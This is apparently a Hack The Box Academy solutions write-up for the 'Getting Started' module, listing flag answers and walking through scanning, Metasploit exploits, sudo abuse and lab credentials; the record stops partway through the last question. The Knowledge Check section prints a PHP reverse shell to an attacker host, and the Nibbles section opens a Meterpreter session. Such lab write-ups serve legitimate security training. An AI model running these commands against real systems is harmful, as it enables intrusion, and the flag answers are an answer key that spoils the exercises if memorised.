| Section                        | Question Number | Answer                                    |
| ------------------------------ | --------------- | ----------------------------------------- |
| Service Scanning               | Question 1      | Apache Tomcat                             |
| Service Scanning               | Question 2      | 2323                                      |
| Service Scanning               | Question 3      | dceece590f3284c3866305eb2473d099          |
| Web Enumeration                | Question 1      | HTB{w3b\_3num3r4710n\_r3v34l5\_53cr375}   |
| Public Exploits                | Question 1      | HTB{my\_f1r57\_h4ck}                      |
| Privilege Escalation           | Question 1      | HTB{l473r4l\_m0v3m3n7\_70\_4n07h3r\_u53r} |
| Privilege Escalation           | Question 2      | HTB{pr1v1l363\_35c4l4710n\_2\_r007}       |
| Nibbles - Enumeration          | Question 1      | 2.4.18                                    |
| Nibbles - Initial Foothold     | Question 1      | 79c03865431abf47b90ef24b9695e148          |
| Nibbles - Privilege Escalation | Question 1      | de5e5d6619862a8aa5b9b212314e0cdd          |
| Knowledge Check                | Question 1      | 7002d65b149b0a4d19132a66feed21d8          |
| Knowledge Check                | Question 2      | f1fba6e9f71efb2630e6e34da6387842          |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Basic Tools

## Question 1

### "Apply what you learned in this section to grab the banner of the above server and submit it as the answer."

After spawning the target machine, students need to perform banner grabbing on the service running on the port given. With `nc`:

Code: shell

```shell
nc STMIP STMPO
```

```
┌─[eu-academy-2]─[10.10.14.154]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nc 209.97.189.80 30488

SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
```

With `socat`:

Code: shell

```shell
socat - TCP4:STMIP:STMPO
```

```
┌─[eu-academy-2]─[10.10.14.154]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ socat - TCP4:209.97.189.80:30488

SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
```

Or even with `telnet`:

Code: shell

```shell
telnet STMIP STMPO
```

```
┌─[us-academy-1]─[10.10.14.82]─[htb-ac413848@htb-gcgq69aboz]─[~]
└──╼ [★]$ telnet 134.122.104.185 30377

Trying 134.122.104.185...
Connected to 134.122.104.185.
Escape character is '^]'.
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
```

Regardless of the tool used, the answer `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1` attained will be the same.

Answer: `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1`

# Service Scanning

## Question 1

### "Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080? "

After spawning the target machine, students need to run an `Nmap` scan against it, using the `-sV` flag (which determines services/versions info) and specifying port 8080, to find that the version of the service running on port 8080 is `Apache Tomcat`:

Code: shell

```shell
nmap -sV -p 8080 STMIP
```

```
┌─[eu-academy-2]─[10.10.14.154]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nmap -sV -p 8080 10.129.197.97

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 17:57 GMT
Nmap scan report for 10.129.197.97
Host is up (0.0058s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat

Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds
```

Answer: `Apache Tomcat`

# Service Scanning

## Question 2

### "Perform an Nmap scan of the target and identify the non-default port that the telnet service running on."

Students need to to run an `Nmap` scan against the spawned target machine, using the `-sV` flag, to notice from `Nmap's` output that the port using `telnet` is 2323:

Code: shell

```shell
nmap -sV STMIP
```

```
┌─[eu-academy-2]─[10.10.14.154]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nmap -sV 10.129.197.97

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 18:11 GMT
Nmap scan report for 10.129.197.97
Host is up (0.039s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
<SNIP>
2323/tcp open  telnet      Linux telnetd
<SNIP>
```

Alternatively, students can use `grep` to filter out `telnet` from the `Nmap` scan result:

Code: shell

```shell
nmap -sV STMIP | grep -i "telnet"
```

```
┌─[eu-academy-2]─[10.10.14.154]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nmap -sV 10.129.197.97 | grep -i "telnet"

2323/tcp open  telnet      Linux telnetd
```

Answer: `2323`

# Service Scanning

## Question 3

### "List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file."

Students first need to list the shares on the spawned target machine using `smbclient` with the `-N` (short version of `--no-pass`) and `-L` (short version of `--list`) flags:

Code: shell

```shell
smbclient -N -L \\\\STMIP
```

```
┌─[eu-academy-2]─[10.10.14.154]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ smbclient -N -L \\\\10.129.197.97

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	users           Disk      
	IPC$            IPC       IPC Service (gs-svcscan server 
	                          (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Then, students need to connect to the `users` share with the user `bob` using `Welcome1` as his password:

Code: shell

```shell
smbclient -U bob \\\\STMIP\\users
```

```
┌─[eu-academy-2]─[10.10.14.154]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ smbclient -U bob \\\\10.129.42.254\\users

Enter WORKGROUP\bob's password: 
Try "help" to get a list of possible commands.
smb: \> ls

  .       D        0  Thu Feb 25 23:06:52 2021
  ..      D        0  Thu Feb 25 20:05:31 2021
  flag    D        0  Thu Feb 25 23:09:26 2021
  bob     D        0  Thu Feb 25 21:42:23 2021
  4062912 blocks of size 1024. 944772 blocks available
```

At last, students need to download "flag.txt" from the `\flag\` directory using the `get` command and then read its contents, to attain the flag `dceece590f3284c3866305eb2473d099`:

Code: shell

```shell
get \flag\flag.txt
!cat flag.txt
```

```
smb:\> get \flag\flag.txt

getting file \flag\flag.txt of size 33 as flag.txt 
(2.7 KiloBytes/sec) 

smb: \flag\> !cat flag.txt

dceece590f3284c3866305eb2473d099
```

Answer: `dceece590f3284c3866305eb2473d099`

# Web Enumeration

## Question 1

### "Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag."

Students first need to fuzz directories and files on the spawned target machine's website using `gobuster`; the `-t` option sets the number of threads to be used while `-q` is the option for being quiet and not displaying erroneous responses:

Code: shell

```shell
gobuster dir -u http://STMIP:STMPO -w /usr/share/wordlists/dirb/common.txt -t 40 -q
```

```
┌─[eu-academy-2]─[10.10.15.88]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ gobuster dir -u http://64.227.39.88:30351 -w /usr/share/wordlists/dirb/common.txt -t 40 -q

/.htpasswd            (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/index.php            (Status: 200) [Size: 990]
/robots.txt           (Status: 200) [Size: 45] 
/server-status        (Status: 403) [Size: 280]
/wordpress            (Status: 301) [Size: 325]
```

Based on the found directories and files, students need to navigate to the `/robots.txt` file, to find one disallowed entry which is `/admin-login-page.php`:

![[HTB Solutions/CPTS/z. images/0ad98581597849582c3aac4e9b399ee8_MD5.jpg]]

Thus, students need to navigate to it to find an admin login panel:

![[HTB Solutions/CPTS/z. images/bfa5edd7d0683eab599ee1f411c41e99_MD5.jpg]]

When viewing the page's source, students will find the exposed credentials `admin:password123` on line 65:

![[HTB Solutions/CPTS/z. images/64e999be7ff1dd2fa33ddd184fb27409_MD5.jpg]]

At last, students need to use the found credentials `admin:password123` to login to the Admin Panel webpage to attain the flag `HTB{w3b_3num3r4710n_r3v34l5_53cr375}`:

![[HTB Solutions/CPTS/z. images/30b6c3879e09751ebd187fe0f2f02569_MD5.jpg]]

Answer: `HTB{w3b_3num3r4710n_r3v34l5_53cr375}`

# Public Exploits

## Question 1

### "Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)"

Students first need to navigate to the root webpage of the spawned target machine to discover that it uses the `Simple Backup Plugin 2.7.10` plugin for `WordPress`:

![[HTB Solutions/CPTS/z. images/b2009ed5c2f70428c3d1a254aa8592f1_MD5.jpg]]

The first result in Google for searching `Simple Backup Plugin 2.7.10` is a guide from [Rapid7](https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/) that explains how to use the `Metasploit` module `auxiliary/scanner/http/wp_simple_backup_file_read` to exploit the directory traversal vulnerability in the plugin:

![[HTB Solutions/CPTS/z. images/a2ab6ffecce1c093d0f70a8bf5648a3c_MD5.jpg]]

Thus, students need to launch `msfconsole` and set the exploit to `auxiliary/scanner/http/wp_simple_backup_file_read`, along with configuring the other options accordingly, specifically, `FILEPATH` to `/flag.txt`. After running the exploit, students will attain the flag `HTB{my_f1r57_h4ck}`:

Code: shell

```shell
msfconsole -q
use auxiliary/scanner/http/wp_simple_backup_file_read
set RHOSTS STMIP
set RPORT STMPO
set FILEPATH /flag.txt
exploit
```

```
┌─[eu-academy-2]─[10.10.15.88]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

msf6 > use auxiliary/scanner/http/wp_simple_backup_file_read
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RHOSTS 209.97.189.80
RHOSTS => 209.97.189.80
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RPORT 30939
RPORT => 30939
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH /flag.txt
FILEPATH => /flag.txt
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > exploit
[+] File saved in: /home/htb-ac413848/.msf4/loot/20220225124019_default_
209.97.189.80_simplebackup.tra_129973.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > cat /home/htb-ac413848/.msf4/loot/20220225124019_default_
209.97.189.80_simplebackup.tra_129973.txt
[*] exec: cat /home/htb-ac413848/.msf4/loot/20220225124019
_default_209.97.189.80_simplebackup.tra_129973.txt

HTB{my_f1r57_h4ck}
```

It is important to note that students will most probably get a different file name which the `Metasploit` module created. Thus, they need to change it accordingly when attempting to concatenate/print its contents.

Answer: `HTB{my_f1r57_h4ck}`

# Privilege Escalation

## Question 1

### "SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'."

Students first need to SSH into the spawned target machine using the credentials `user1:password1`:

Code: shell

```shell
ssh user1@STMIP -p STMPO
```

```
┌─[eu-academy-2]─[10.10.15.88]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh user1@139.59.175.51 -p 31509

<SNIP>
Password: 

Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.19.0-17-cloud-amd64 x86_64)

<SNIP>

user1@gettingstartedprivesc-413848-767c4c8dff-mwwxb:~$
```

Afterward, students need to list the allowed (and forbidden) commands for the invoking user on the spawned target machine with `sudo`, to find that `user1` can execute `/bin/shell-session` as user2 without a password:

Code: shell

```shell
sudo -l
```

```
user1@ng-413848-gettingstartedprivesc-j3rjw-6649d4bcf8-xszvs:~$ sudo -l

Matching Defaults entries for user1 on ng-413848-gettingstartedprivesc-j3rjw-6649d4bcf8-xszvs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on ng-413848-gettingstartedprivesc-j3rjw-6649d4bcf8-xszvs:
    (user2 : user2) NOPASSWD: /bin/bash
```

Therefore, students need to abuse this misconfiguration to attain a shell session as `user2`:

Code: shell

```shell
sudo -u user2 /bin/bash
```

```
user1@ng-413848-gettingstartedprivesc-j3rjw-6649d4bcf8-xszvs:~$ sudo -u user2 /bin/bash
user2@ng-413848-gettingstartedprivesc-j3rjw-6649d4bcf8-xszvs:/home/user1$ whoami

user2
```

At last, students need to read the flag file "flag.txt", finding it to be `HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}`:

Code: shell

```shell
cat ~/flag.txt
```

```
user2@gettingstartedprivesc-413848-767c4c8dff-mwwxb:/home/user1$ cat ~/flag.txt

HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
```

Answer: `HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}`

# Privilege Escalation

## Question 2

### "Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'."

Students first need to know that they can access the root directory because it is misconfigured, given that the group to which it belongs to is `user2`:

Code: shell

```shell
ls -lA /
```

```
user2@gettingstartedprivesc-413848-767c4c8dff-mwwxb:~$ ls -lA /

total 60
<SNIP>
dr-xr-xr-x 484 root root     0 Feb 25 12:58 proc
drwxr-x---   1 root user2 4096 Feb 12  2021 root

<SNIP>
```

After changing directories into the `/root` directory, students will notice that the `.ssh/` directory, similar to the root directory, is also misconfigured:

Code: shell

```shell
cd /root
ls -lA
```

```
user2@gettingstartedprivesc-413848-767c4c8dff-mwwxb:/$ cd /root
user2@gettingstartedprivesc-413848-767c4c8dff-mwwxb:/root$ ls -lA

total 24
-rwxr-x--- 1 root user2    5 Aug 19  2020 .shell-session_history
-rwxr-x--- 1 root user2 3106 Dec  5  2019 .shell-sessionrc
-rwxr-x--- 1 root user2  161 Dec  5  2019 .profile
drwxr-x--- 1 root user2 4096 Feb 12  2021 .ssh
-rwxr-x--- 1 root user2 1309 Aug 19  2020 .viminfo
-rw------- 1 root root    33 Feb 12  2021 flag.txt
```

After changing directories into the `.ssh/` directory, students will notice that the permissions of the private key of the root user are misconfigured such that anyone can read it:

Code: shell

```shell
cd .ssh/
ls -lA
```

```
user2@gettingstartedprivesc-413848-767c4c8dff-mwwxb:/root$ cd .ssh/
user2@gettingstartedprivesc-413848-767c4c8dff-mwwxb:/root/.ssh$ ls -lA

total 12
-rw------- 1 root root  571 Feb 12  2021 authorized_keys
-rw-r--r-- 1 root root 2602 Feb 12  2021 id_rsa
-rw-r--r-- 1 root root  571 Feb 12  2021 id_rsa.pub
```

Thus, students need to abuse this misconfiguration by using SSH to login as the root user. To do so, students need to know the active connections on the spawned target machine, and what ports they are listening on by using `netstat`, finding port `80` listening for connections:

Code: shell

```shell
netstat -antpl
```

```
ser2@ng-413848-gettingstartedprivesc-j3rjw-6649d4bcf8-xszvs:/home/user1$ netstat -antpl

(No info could be read for "-p": geteuid()=1001 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0    268 10.244.2.245:80         159.65.30.65:35600      ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -
```

Before attempting to connect to port 80, students can grab the banner of the service running using `nc`, finding it to be SSH (students can use `Ctrl` + `c` to exit from the connection):

Code: shell

```shell
nc localhost 80
```

```
user2@ng-413848-gettingstartedprivesc-j3rjw-6649d4bcf8-xszvs:/home/user1$ nc localhost 80

SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
```

Thus, at last, students need to SSH as the root user via port `80` on localhost of the spawned target machine and read the flag file "flag.txt", finding it to be `HTB{pr1v1l363_35c4l4710n_2_r007}`:

Code: shell

```shell
ssh -i id_rsa root@localhost -p 80
Y
cat flag.txt
```

```
user2@gettingstartedprivesc-413848-767c4c8dff-mwwxb:/root/.ssh$ ssh -i id_rsa root@localhost -p 80

The authenticity of host '[localhost]:80 ([::1]:80)' can't be established.
ECDSA key fingerprint is SHA256:uPhd/rA1lfr98Kwr8nmqVSC+5TiJyW1d2Bb/8nm7F/U.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '[localhost]:80' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.19.0-17-cloud-amd64 x86_64)
<SNIP>
root@gettingstartedprivesc-413848-767c4c8dff-mwwxb:~# cat flag.txt

HTB{pr1v1l363_35c4l4710n_2_r007}
```

Answer: `HTB{pr1v1l363_35c4l4710n_2_r007}`

# Nibbles - Enumeration

## Question 1

### "Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)"

Students first need to run an `Nmap` scan against the spawned target machine with the `-sC` and `-sV` flags, to find that the `Apache` version is `2.4.18`:

Code: shell

```shell
nmap -sC -sV STMIP
```

```
┌─[eu-academy-2]─[10.10.15.88]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.200.170

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 14:07 GMT
Nmap scan report for 10.129.200.170
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 
(Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Answer: `2.4.18`

# Nibbles - Initial Foothold

## Question 1

### "Gain a foothold on the target and submit the user.txt flag"

First, students need to visit the root webpage of the website that the spawned target machine is hosting, and by viewing its source, they will notice an exposed comment mentioning the `/nibbleblog` directory:

![[HTB Solutions/CPTS/z. images/cffe65fe123a7418a1a4c0ae2039cbde_MD5.jpg]]

Students then need to perform directory fuzzing using `gobuster` on the found directory `/nibbleblog/`:

Code: shell

```shell
gobuster dir -u http://STMIP/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt -t 40 -q
```

```
┌─[eu-academy-2]─[10.10.15.88]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.211.176/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt -t 40 -q

/.htpasswd    (Status: 403) [Size: 309]
/.htaccess    (Status: 403) [Size: 309]
/.hta         (Status: 403) [Size: 304]
/admin        (Status: 301) [Size: 327]
/admin.php    (Status: 200) [Size: 1401]                                             
/content      (Status: 301) [Size: 329] 
/index.php    (Status: 200) [Size: 2989]                                               
/languages    (Status: 301) [Size: 331] 
/plugins      (Status: 301) [Size: 329]   
/README       (Status: 200) [Size: 4628]                                                 
/themes       (Status: 301) [Size: 328] 
```

Subsequently, students need to navigate to `/content/` and notice that it has directory listing enabled:

![[HTB Solutions/CPTS/z. images/81825bb7517c4802c261405cc09994dd_MD5.jpg]]

After that, students need to open the XML file at `/content/private/users.xml` to notice the username `admin`:

![[HTB Solutions/CPTS/z. images/d454ad0e45a9f4be8df3b35c51cbde2f_MD5.jpg]]

Additionally, when students visit the XML file at `/content/private/config.xml`, they will notice the excessive usage of the word `nibbles`:

![[HTB Solutions/CPTS/z. images/e246a0ad26ca72821cbde29c1bb129b2_MD5.jpg]]

Students will either deduce that `nibbles` is the password of the `admin` user due to it repeating many times, or they might use custom password list generators such as `CeWL` and use it to bruteforce the login form at `/nibbleblog/admin.php`.

From the directory fuzzing results, students need to visit `/nibbleblog/admin.php` and supply the credentials `admin:nibbles`:

![[HTB Solutions/CPTS/z. images/47d21ed10ee72dbdb545786e8f94457b_MD5.jpg]]

![[HTB Solutions/CPTS/z. images/c39cd5d163559838d5ea6a78966f5fae_MD5.jpg]]

Remembering the found directories from `gobuster`, students can determine the version of the `nibbleblog` running on the spawned target machine by reading the `README` file, finding it to be `4.0.3`:

![[HTB Solutions/CPTS/z. images/4dce61aa39e9fff4bcf5e258a5865a43_MD5.jpg]]

Students now need to search for a public exploit for this specific version. One approach is by using `searchsploit`:

Code: shell

```shell
searchsploit "Nibbleblog 4.0.3"
```

```
┌─[eu-academy-2]─[10.10.15.88]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ searchsploit "Nibbleblog 4.0.3"

Exploit Title | Path
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb
Shellcodes: No Results
```

To exploit the arbitrary file upload vulnerability and gain remote code execution, students could either follow the manual method described in the module's section or use the `exploit/multi/http/nibbleblog_file_upload` exploit in `msfconsole`:

Code: shell

```shell
msfconsole -q
use exploit/multi/http/nibbleblog_file_upload
set LHOST PWNIP
set USERNAME admin
set PASSWORD nibbles
set RHOSTS STMIP
set TARGETURI /nibbleblog/
exploit
```

```
┌─[eu-academy-2]─[10.10.15.88]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

msf6 > use exploit/multi/http/nibbleblog_file_upload
msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST 10.10.15.88
LHOST => 10.10.15.88
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.211.176
RHOSTS => 10.129.211.176
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog/
TARGETURI => /nibbleblog/

msf6 exploit(multi/http/nibbleblog_file_upload) > exploit
[*] Started reverse TCP handler on 10.10.15.8:4444 
[*] Sending stage (39282 bytes) to 10.129.211.176
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.15.8:4444 -> 10.129.211.176:48026) at 2022-02-28 12:01:48 +0000
meterpreter > shell
Process 16673 created.
Channel 0 created.
whoami

nibbler
```

After gaining a `Meterpreter` session, students can upgrade their dumb TTY terminal and make it interactive:

Code: shell

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ export TERM=xterm        
```

Subsequently, students will be able to read the flag file "user.txt", finding it to be `79c03865431abf47b90ef24b9695e148`:

Code: shell

```shell
cat /home/nibbler/user.txt
```

```
nibbler@Nibbles:/home/nibbler$ cat /home/nibbler/user.txt

79c03865431abf47b90ef24b9695e148
```

Answer: `79c03865431abf47b90ef24b9695e148`

# Nibbles - Privilege Escalation

## Question 1

### "Escalate privileges and submit the root.txt flag."

To escalate privileges, students can either run automated privilege escalation checking tools such as ['linpeas.sh'](https://github.com/carlospolop/PEASS-ng/releases/download/20220227/linpeas.sh) or perform manual checks. Checking for the allowed commands for the invoking user `nibbler` reveals a misconfiguration that can be exploited, which is that the script "monitor.sh" can be run with sudo privileges by the invoking user `nibbler` :

Code: shell

```shell
sudo -l
```

```
nibbler@Nibbles:/home/nibbler$ sudo -l

Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:
	/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Therefore, students first need to unzip "personal.zip":

Code: shell

```shell
unzip personal.zip
```

```
nibbler@Nibbles:/home/nibbler$ unzip personal.zip

unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
```

Then, when checking the permissions on the "monitor.sh" script, students will notice that it is misconfigured, as it is world-writable:

Code: shell

```shell
ls -l personal/stuff/monitor.sh
```

```
nibbler@Nibbles:/home/nibbler$ ls -l personal/stuff/monitor.sh

-rwxrwxrwx 1 nibbler nibbler 4015 May8  2015 personal/stuff/monitor.sh
```

Thus, from here, students could either write a reverse-shell code inside "monitor.sh" and catch it on `Pwnbox`/`PMVPN`, or, they could write a command to concatenate/print the contents of the flag "root.txt" which is under the `/root/` directory. Either way, the script must be executed with sudo. Students will attain the flag `de5e5d6619862a8aa5b9b212314e0cdd`:

Code: shell

```shell
echo "cat /root/root.txt" > personal/stuff/monitor.sh
sudo ./personal/stuff/monitor.sh
```

```
nibbler@Nibbles:/home/nibbler$ echo "cat /root/root.txt" > personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ sudo ./personal/stuff/monitor.sh

de5e5d6619862a8aa5b9b212314e0cdd
```

Answer: `de5e5d6619862a8aa5b9b212314e0cdd`

# Knowledge Check

## Question 1

### "Spawn the target, gain a foothold and submit the contents of the user.txt flag."

Students need to first start their enumeration by a port scan using `Nmap`:

Code: shell

```shell
nmap -sC -sV STMIP
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@htb-co8vkqsbet]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.163.178

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 12:59 GMT
Nmap scan report for 10.129.163.178
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 
(Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to GetSimple! - gettingstarted
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the root webpage of the web application, students will notice that the spawned target machine uses the `GetSimple` `CMS`:

![[HTB Solutions/CPTS/z. images/45b655a8737b5576b4b111528b70ddb5_MD5.jpg]]

After performing directory fuzzing, students will find the `/admin/` directory. Navigating to it, they are prompted for credentials. Before attempting brute-forcing on the login form, students should check for default/common credentials first, and they will find that `admin:admin` are used (another method to bypass the login page is by getting an API key from: `http://STMIP/data/other/authorization.xml`):

![[HTB Solutions/CPTS/z. images/bf1cf66d4328b844569e5bfe72f35387_MD5.jpg]]

Once logged in, students will notice that the version of the `CMS` is `3.3.15`:

![[HTB Solutions/CPTS/z. images/35684641e28fd99c5a0583f4d329c1c5_MD5.jpg]]

Version `3.3.15` and before suffer from [unauthenticated remote code execution](https://ssd-disclosure.com/ssd-advisory-getcms-unauthenticated-remote-code-execution/). To exploit this vulnerability, students can use `Metasploit` or carry out the exploit manually. For manual exploitation, students need to go to "Theme", then "Edit Theme" in the dashboard (or by navigating to `http://STMIP/admin/theme-edit.php` directly) and add a PHP reverse-shell at the beginning of the file:

Code: php

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'"); ?>
```

![[HTB Solutions/CPTS/z. images/4fc672fe503adf803446f6ae1e78a1d6_MD5.jpg]]

Students then need to start a listener on their `Pwnbox`/`PMVPN` using `nc`:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@htb-co8vkqsbet]─[~]
└──╼ [★]$ nc -nvlp 1234

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

Subsequently, students need to visit the `/template.php` web page (`http://STMIP/theme/Innovation/template.php`) to execute the PHP reverse-shell code:

![[HTB Solutions/CPTS/z. images/d90b0322fceeb74ab76c9a5f30d1ab74_MD5.jpg]]

If performed correctly, students will receive the call back on the `nc` listener:

```
Ncat: Connection from 10.129.42.249.
Ncat: Connection from 10.129.42.249:42840.
bash: cannot set terminal process group (1014): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gettingstarted:/var/www/html/theme/Innovation$ 
```

Students need to upgrade their dumb TTY terminal and make it interactive:

Code: shell

```shell
python3 -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm
```

```
www-data@gettingstarted:/var/www/html/theme/Innovation$ python3 -c 'import pty;pty.spawn("/bin/bash");'    
www-data@gettingstarted:/var/www/html/theme/Innovation$ export TERM=xterm
```

At last, students can read the "user.txt" flag found within the `/home/mrb3n/` directory, finding it to be `7002d65b149b0a4d19132a66feed21d8`:

Code: shell

```shell
cat /home/mrb3n/user.txt
```

```
www-data@gettingstarted:/var/www/html/theme/Innovation$ cat /home/mrb3n/user.txt

7002d65b149b0a4d19132a66feed21d8
```

Answer: `7002d65b149b0a4d19132a66feed21d8`

# Knowledge Check

## Question 2

### "After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag."

Using the same reverse-shell connection established in the previous question, many approaches can be taken to solve this question.

A first approach is whereby students check the allowed commands for the invoking user on the spawned target machine, to notice that the user `www-data` can run as `root` the `PHP` command:

Code: shell

```shell
sudo -l
```

```
www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo -l

Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:
	/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

According to [GTFOBins](https://gtfobins.github.io/gtfobins/php/#sudo), this can be abused to gain an elevated shell-session shell:

Code: shell

```shell
sudo php -r "system('/bin/bash');"
whoami
```

```
